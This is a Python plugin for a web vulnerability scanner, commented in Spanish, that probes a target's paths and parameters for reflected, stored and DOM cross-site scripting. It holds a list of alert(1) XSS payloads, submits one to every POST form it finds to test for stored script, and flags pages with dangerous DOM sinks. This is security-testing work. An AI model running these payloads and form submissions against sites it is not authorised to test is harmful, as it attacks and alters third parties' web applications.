#!/usr/bin/env python3
"""Plugin XSS: reflejado, stored y DOM XSS con confirmación.

Mejora v3:
  * Reflejado: payload reflejado sin escapar en la respuesta.
  * Stored: detecta formularios POST y comprueba si el payload se almacena.
  * DOM XSS: detecta patrones peligrosos en la respuesta (document.write,
    innerHTML, eval) combinados con entrada del usuario.
"""
from engine import confirm_xss_reflected

XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "'><svg/onload=alert(1)>", "\"><script>alert(1)</script>",
                "<details open ontoggle=alert(1)>", "<body onload=alert(1)>"]
XSS_PATHS = ["", "/search", "/buscar", "/q", "/s", "/find", "/comment",
             "/notes", "/product", "/items", "/query", "/results", "/guestbook"]
XSS_PARAMS = ["q", "search", "s", "id", "name", "term", "query", "text",
              "keyword", "p", "value", "comment", "msg", "input"]
DOM_SINKS = ["document.write(", "document.writeln(", "innerHTML", "outerHTML",
             "eval(", "setTimeout(", "setInterval(", "execScript("]


def _snippet(body, payload, max_len=200):
    idx = body.lower().find(payload.lower())
    if idx < 0:
        return ""
    start = max(0, idx - 40)
    end = min(len(body), idx + len(payload) + 60)
    return body[start:end].replace("\n", " ")


def run(ctx):
    crawl = getattr(ctx, "_crawl", {}) or {}
    targets = []
    seen = set()

    def add(url_base, param):
        key = (url_base.rstrip("/"), param)
        if key not in seen:
            seen.add(key)
            targets.append((url_base, param))

    # GET forms + params
    for f in (crawl.get("forms") or []):
        if (f.get("method") or "GET").upper() == "GET":
            act = f.get("action") or ctx.target
            for p in (f.get("params") or []):
                add(act, p)
    crawled_urls = sorted(u.split("?")[0] for u in (crawl.get("urls") or set()))
    for p in (crawl.get("params") or set()):
        p = str(p)
        if p:
            add(ctx.target, p)
            for u in crawled_urls:
                if u.startswith(ctx.target.rstrip("/")):
                    add(u, p)
    for sp in XSS_PATHS:
        base_url = ctx.target.rstrip("/") + sp
        for param in XSS_PARAMS:
            add(base_url, param)

    # POST forms para stored XSS
    post_forms = [f for f in (crawl.get("forms") or [])
                  if (f.get("method") or "GET").upper() == "POST"]

    hits = []
    # Reflected XSS
    for base_url, param in targets:
        if ctx.ctrl("xss") in ("stop", "skip"):
            break
        for p in XSS_PAYLOADS:
            if ctx.ctrl("xss") in ("stop", "skip"):
                break
            rr = ctx.req("GET", base_url, {param: p})
            if rr.get("code") == 200 and confirm_xss_reflected(rr.get("body", ""), p):
                hits.append(f"{base_url} {param}")
                snip = _snippet(rr.get("body", ""), p)
                ctx.emit({
                    "type": "finding",
                    "severity": "high",
                    "module": "xss",
                    "confidence": "confirmed",
                    "detail": f"Cross-Site Scripting — CONFIRMED\n    URL: {base_url}\n    Parámetro: {param}\n    Método: GET\n    Tipo: Reflected XSS\n    Confidence: High\n    Evidence: payload reflejado sin escapar en la respuesta\n    Snippet: {snip}\n    Template/rule: HTScanner xss plugin (reflected)\n    Request de verificación: reproducible",
                    "evidence": {
                        "url": base_url,
                        "param": param,
                        "method": "GET",
                        "type": "Reflected XSS",
                        "confidence": "confirmed",
                        "detail": "payload reflejado sin escapar en la respuesta",
                        "template": "HTScanner xss plugin (reflected)",
                        "request": f"GET {base_url}?{param}={p}",
                        "snippet": snip,
                        "payload": p,
                    }
                })
                break

    # Stored XSS: enviar POST y re-leer la página
    for f in post_forms:
        if ctx.ctrl("xss") in ("stop", "skip"):
            break
        act = f.get("action") or ctx.target
        data = {p: XSS_PAYLOADS[0] for p in (f.get("params") or [])}
        if not data:
            continue
        rr = ctx.req("POST", act, data=data)
        if rr.get("code") in (200, 201, 302):
            rr2 = ctx.req("GET", act)
            body = rr2.get("body", "") or ""
            if XSS_PAYLOADS[0] in body and confirm_xss_reflected(body, XSS_PAYLOADS[0]):
                hits.append(f"stored {act}")
                snip = _snippet(body, XSS_PAYLOADS[0])
                ctx.emit({
                    "type": "finding",
                    "severity": "high",
                    "module": "xss",
                    "confidence": "confirmed",
                    "detail": f"Cross-Site Scripting — CONFIRMED\n    URL: {act}\n    Método: POST (stored)\n    Tipo: Stored XSS\n    Confidence: High\n    Evidence: payload persistido y reflejado tras POST\n    Snippet: {snip}\n    Template/rule: HTScanner xss plugin (stored)\n    Request de verificación: reproducible",
                    "evidence": {
                        "url": act,
                        "method": "POST",
                        "type": "Stored XSS",
                        "confidence": "confirmed",
                        "detail": "payload persistido y reflejado tras POST",
                        "template": "HTScanner xss plugin (stored)",
                        "request": f"POST {act}",
                        "snippet": snip,
                        "payload": XSS_PAYLOADS[0],
                    }
                })

    # DOM XSS: buscar sinks peligrosos combinados con parámetros
    for base_url, param in targets:
        if ctx.ctrl("xss") in ("stop", "skip"):
            break
        rr = ctx.req("GET", base_url, {param: XSS_PAYLOADS[0]})
        body = rr.get("body", "") or ""
        if rr.get("code") == 200:
            low = body.lower()
            if any(sink.lower() in low for sink in DOM_SINKS) and XSS_PAYLOADS[0] in body:
                hits.append(f"dom {base_url} {param}")
                snip = _snippet(body, XSS_PAYLOADS[0])
                ctx.emit({
                    "type": "finding",
                    "severity": "high",
                    "module": "xss",
                    "confidence": "confirmed",
                    "detail": f"Cross-Site Scripting — CONFIRMED\n    URL: {base_url}\n    Parámetro: {param}\n    Método: GET\n    Tipo: DOM XSS\n    Confidence: High\n    Evidence: sink peligroso ({[s for s in DOM_SINKS if s.lower() in low][0]}) con entrada del usuario reflejada\n    Snippet: {snip}\n    Template/rule: HTScanner xss plugin (dom)\n    Request de verificación: reproducible",
                    "evidence": {
                        "url": base_url,
                        "param": param,
                        "method": "GET",
                        "type": "DOM XSS",
                        "confidence": "confirmed",
                        "detail": "sink peligroso con entrada del usuario reflejada",
                        "template": "HTScanner xss plugin (dom)",
                        "request": f"GET {base_url}?{param}={XSS_PAYLOADS[0]}",
                        "snippet": snip,
                        "payload": XSS_PAYLOADS[0],
                    }
                })

    ctx.emit({"type": "module", "name": "xss", "status": "done",
              "msg": f"XSS: {len(hits)} confirmado(s)", "findings": hits})

